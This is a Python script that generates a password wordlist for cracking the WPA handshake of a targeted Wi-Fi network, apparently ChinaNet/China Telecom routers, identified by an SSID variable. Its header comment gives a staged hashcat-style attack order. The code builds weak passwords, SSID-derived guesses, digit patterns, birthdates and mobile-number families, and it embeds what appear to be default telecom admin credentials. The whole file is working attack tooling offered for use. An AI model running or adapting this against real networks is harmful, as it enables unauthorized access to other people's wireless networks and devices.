# gen_dict.py - build the fallback wordlist for the target SSID (set RK_SSID).
#
# Order of attack once we have a handshake:
#   1) this dictionary                       (seconds)
#   2) dictionary + best64 rules             (seconds)
#   3) ?d x8  full 8-digit sweep             (~5 min at 337 kH/s)
#   4) ?d x9                                 (~50 min)
#   5) hybrid: dict + 4 trailing digits      (minutes)
# Everything below is >= 8 chars: the WPA kernel refuses shorter candidates.

import sys
if hasattr(sys.stdout, "reconfigure"):   # Windows 控制台默认 cp1252，中文输出会直接崩
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import os

OUT = os.environ.get("RK_DICT_OUT", "wordlists/common.dict")
SSID = os.environ.get("RK_SSID", "")       # used to derive SSID-flavoured candidates
SUFFIX = SSID[-4:] if len(SSID) >= 4 else ""  # trailing 4 chars of the SSID

words = set()

# --- 1. generic weak passwords (8+ chars only) ---
generic = """
12345678 123456789 1234567890 87654321 88888888 11111111 00000000 66666666
11223344 12341234 12344321 43214321 12312312 12121212 13131313 11112222
11221122 55667788 99887766 13572468 24681357 147258369 963852741 789456123
159753159 31415926 11235813 12345678900 000000000 111111111 55555555
abc12345 a1234567 admin123 admin888 admin1234 password1 passw0rd qwerty123
qwertyuiop 1q2w3e4r 1qaz2wsx zaq12wsx abcd1234 test1234 testtest iloveyou1
woaini1314 woaini520 a5201314 5201314520 520520520 13145200 13141314
888888888 666666666 999999999 16881688 51885188 66668888 88886666
telecomadmin nE7jA%5m admintelecom ChinaNet123 chinanet123 chinanet888
wifi12345 wifi88888 router123 router888 1234abcd 12345678a a12345678
aa123456 aaa12345 ab123456 abcabc12 123abc45 1a2b3c4d password88
""".split()
words.update(generic)

# --- 2. SSID-derived guesses ---
base = ["chinanet", "ChinaNet", "CHINANET", SUFFIX, SUFFIX.lower(), SUFFIX.upper(),
        "telecom", "dianxin", "10000"]
suffixes = ["", "123", "1234", "12345", "888", "8888", "6666", "520", "1314", "0000",
            "1111", "2019", "2020", "2021", "2022", "2023", "2024", "2025", "abcd"]
for b in base:
    for s in suffixes:
        w = b + s
        if len(w) >= 8:
            words.add(w)
        w2 = s + b
        if len(w2) >= 8:
            words.add(w2)
words.add(SUFFIX + SUFFIX)
words.add(SUFFIX.lower() + SUFFIX.lower())

# --- 3. 8-digit patterns that a human would actually pick ---
digits = "0123456789"
for d in digits:
    words.add(d * 8)
    words.add(d * 9)
    words.add(d * 10)
for start in range(0, 10):
    # ascending / descending runs, wrapping
    asc = "".join(str((start + i) % 10) for i in range(8))
    desc = "".join(str((start - i) % 10) for i in range(8))
    words.add(asc)
    words.add(desc)
    words.add(asc[:4] * 2)
for a in digits:
    for b in digits:
        words.add((a + b) * 4)          # abababab
        words.add(a * 2 + b * 2 + a * 2 + b * 2)  # aabbaabb
        words.add(a * 4 + b * 4)        # aaaabbbb
        words.add(a + b + a + b + a + b + a + b)
lucky = ["1688", "5188", "6666", "8888", "1314", "5200", "9999", "6868", "8886"]
for l in lucky:
    words.add(l * 2)
    for l2 in lucky:
        words.add(l + l2)

# --- 4. dates YYYYMMDD (people love birthdays) ---
for y in range(1950, 2026):
    for m in range(1, 13):
        for d in range(1, 32):
            words.add("%04d%02d%02d" % (y, m, d))

# --- 5. mobile-ish numbers: a few structural families, not the full 1e9 space ---
for pre in ["130", "131", "132", "133", "134", "135", "136", "137", "138", "139",
            "150", "151", "152", "157", "158", "159", "182", "183", "184", "187",
            "188", "176", "177", "178", "199", "166"]:
    for tail in ["00000000", "12345678", "88888888", "66666666", "11111111",
                 "00000001", "12341234", "87654321", "52013140", "13145200"]:
        words.add(pre + tail)

words = sorted(w for w in words if len(w) >= 8 and len(w) <= 63)
if os.path.dirname(OUT):
    os.makedirs(os.path.dirname(OUT), exist_ok=True)
with open(OUT, "w", encoding="utf-8") as f:
    f.write("\n".join(words) + "\n")
print("wrote %d candidates -> %s" % (len(words), OUT))
print("sample:", words[:12])
